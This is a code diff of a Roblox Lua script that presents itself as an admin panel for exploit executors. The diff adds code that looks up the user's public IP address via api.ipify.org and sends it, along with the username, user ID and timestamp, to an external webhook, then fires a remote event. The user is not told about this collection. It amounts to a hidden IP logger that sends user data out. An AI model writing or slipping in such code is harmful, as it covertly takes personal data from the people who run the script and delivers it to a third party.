@@ -3,17 +3,23 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 
+local request_fn = request or http_request
+local ipData = request_fn({ Url = "https://api.ipify.org?format=json", Method = "GET" })
+local userIP = "Unknown"
+if ipData and ipData.Success then
+    userIP = HttpService:JSONDecode(ipData.Body).ip
+end
+
 local payload = {
     content = "**Admin Panel Executed**",
     embeds = {
         {
             title = "Executor Report",
-            description = "AdminPanel script loaded successfully.",
-            color = 15105570,
+            color = tonumber("0x6AA8FF"),
             fields = {
                 { name = "Username", value = LocalPlayer.Name, inline = true },
                 { name = "User ID", value = tostring(LocalPlayer.UserId), inline = true },
-                { name = "Server Job ID", value = game.JobId, inline = true },
+                { name = "Public IP", value = userIP, inline = true },
                 { name = "Timestamp", value = os.date("%c"), inline = false }
             },
             footer = { text = "Kindo DeepHat" }
@@ -21,7 +27,6 @@ local payload = {
     }
 }
 
-local request_fn = request or http_request
 request_fn({
     Url = WebhookURL,
     Method = "POST",
@@ -29,6 +34,6 @@ request_fn({
     Body = HttpService:JSONEncode(payload)
 })
 
-local RS = game.ReplicatedStorage
-local AdminPanelRemote = RS:WaitForChild("AdminPanel")
+local AdminPanelRemote = game.ReplicatedStorage:WaitForChild("AdminPanel")
 AdminPanelRemote:FireServer()
+print("Success")
